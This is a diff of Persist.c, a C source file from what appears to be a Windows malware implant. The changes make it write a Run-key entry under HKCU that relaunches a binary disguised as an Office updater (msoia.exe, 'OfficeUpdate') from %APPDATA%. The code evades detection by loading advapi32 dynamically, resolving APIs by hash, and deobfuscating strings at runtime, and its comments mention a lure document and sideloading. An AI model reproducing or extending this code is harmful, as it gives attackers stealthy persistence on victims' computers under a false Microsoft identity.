@@ -1,21 +1,24 @@
 // =============================================
-// Persist.c - Registry Run-Key Persistence
+// Persist.c - Registry Run-Key Persistence  (non-UAC builds only)
 //
-// Writes the current EXE path (or host EXE for sideload builds) to:
+// UAC builds (build.bat uac / build.bat sideload uac) do NOT compile this
+// file — they use a scheduled task registered inside InstallAndTerminate /
+// SideloadInstallAndContinue instead.
 //
-//   HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run   (UAC builds)
-//   HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run   (non-UAC builds)
+// This file is compiled only for non-UAC builds (build.bat / build.bat sideload).
+// It is called when the persistence copy of msoia.exe detects it is the reboot
+// instance (self-guard in InstallAndTerminate / SideloadInstallAndContinue fires
+// and returns), so the run key is written on every subsequent boot (idempotent).
 //
-// Root key is chosen at compile time:
-//   REQUIRE_ADMINISTRATOR  (EXE UAC)  → HKLM
-//   REQUIRE_ELEVATION      (DLL UAC)  → HKLM
-//   (neither)                         → HKCU
+// Always writes to HKCU (medium IL — non-UAC builds run at medium IL):
 //
-// Build types:
-//   exe          → persists WUAssistant.exe (HKCU, medium IL)
-//   exe uac      → persists WUAssistant.exe (HKLM, high IL)
-//   sideload     → persists host EXE        (HKCU, medium IL)
-//   sideload uac → persists host EXE        (HKLM, high IL)
+//   EXE builds:
+//     HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+//       "OfficeUpdate" = "%APPDATA%\Microsoft\Office\Updates\msoia.exe"
+//
+//   Sideload builds:
+//     HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+//       "OfficeUpdate" = "%APPDATA%\Microsoft\Office\Updates\msoia.exe /pf"
 //
 // advapi32 is loaded dynamically so it does not appear in the IAT.
 // Registry function pointers are resolved by JOAAT hash (no plaintext names).
@@ -72,18 +75,45 @@ BOOL InstallPersistence(IN PAPI_HASHING pApi) {
     fnGetModFNW pGetModFNW = (fnGetModFNW)FetchExportAddress(pKernel32, GetModuleFileNameW_JOAAT);
     if (!pGetModFNW) return FALSE;
 
-    // --- Get current EXE full path (WCHAR) ---
-    //     For sideload builds, GetModuleFileNameW(NULL) returns the HOST EXE,
-    //     which is exactly what we want to persist.
-    //     Reserve 4 extra chars for the "/pf" persistence marker appended below.
+    // --- Get EXE path to persist ---
+    // Always point the run key at %APPDATA%\Microsoft\Office\Updates\msoia.exe.
+    // Both install functions (InstallAndTerminate for EXE, SideloadInstallAndContinue
+    // for sideload) have already copied the binary there before self-terminating.
+    // This function is only reached on reboot (self-guard returned), so the file
+    // is guaranteed to exist at the destination.
+    // Reserve 4 extra chars for the " /pf" persistence marker appended below (BUILD_DLL).
     WCHAR szExePath[MAX_PATH + 4] = {0};
-    DWORD dwPathLen = pGetModFNW(NULL, szExePath, MAX_PATH);
-    if (!dwPathLen || dwPathLen >= MAX_PATH) return FALSE;
+    DWORD dwPathLen = 0;
+
+    // Build "%APPDATA%\Microsoft\Office\Updates\msoia.exe" for all builds.
+    {
+        typedef DWORD (WINAPI* fnGetEnvA2)(LPCSTR, LPSTR, DWORD);
+        BYTE xGetEnvB[] = XSTR_GET_ENV_VAR_A;   DEOBF(xGetEnvB);
+        fnGetEnvA2 pGetEnvB = (fnGetEnvA2)pApi->pGetProcAddress((HMODULE)pKernel32, (LPCSTR)xGetEnvB);
+        CHAR szDestA[MAX_PATH] = {0};
+        BYTE xAppB[]  = XSTR_APPDATA_VAR;        DEOBF(xAppB);
+        if (pGetEnvB && pGetEnvB((LPCSTR)xAppB, szDestA, MAX_PATH)) {
+            SIZE_T n = 0; while (szDestA[n]) n++;
+            BYTE xSubB[] = XSTR_INSTALL_SUBDIR;  DEOBF(xSubB);
+            for (SIZE_T i = 0; xSubB[i] && n < MAX_PATH-1; i++) szDestA[n++] = xSubB[i];
+            BYTE xPnB[]  = XSTR_PERSIST_EXE_NAME; DEOBF(xPnB);
+            for (SIZE_T i = 0; xPnB[i]  && n < MAX_PATH-1; i++) szDestA[n++] = xPnB[i];
+            szDestA[n] = 0;
+            for (dwPathLen = 0; szDestA[dwPathLen] && dwPathLen < MAX_PATH; dwPathLen++)
+                szExePath[dwPathLen] = (WCHAR)(unsigned char)szDestA[dwPathLen];
+            szExePath[dwPathLen] = L'\0';
+        }
+    }
+
+    // Fallback: if APPDATA lookup failed, use current EXE path (should not happen).
+    if (!dwPathLen) {
+        dwPathLen = pGetModFNW(NULL, szExePath, MAX_PATH);
+        if (!dwPathLen || dwPathLen >= MAX_PATH) return FALSE;
+    }
 
 #ifdef BUILD_DLL
-    // Append " /pf" marker so OpenBindFile() can detect persistence relaunches
-    // and skip opening the lure document on boot.  The marker is never shown to
-    // the user — it lives only in the run-key value string.
+    // Append " /pf" so SideloadInstallAndContinue's self-guard detects persistence
+    // reboots and skips file copy. Never visible to the user — run-key value only.
     szExePath[dwPathLen + 0] = L' ';
     szExePath[dwPathLen + 1] = L'/';
     szExePath[dwPathLen + 2] = L'p';
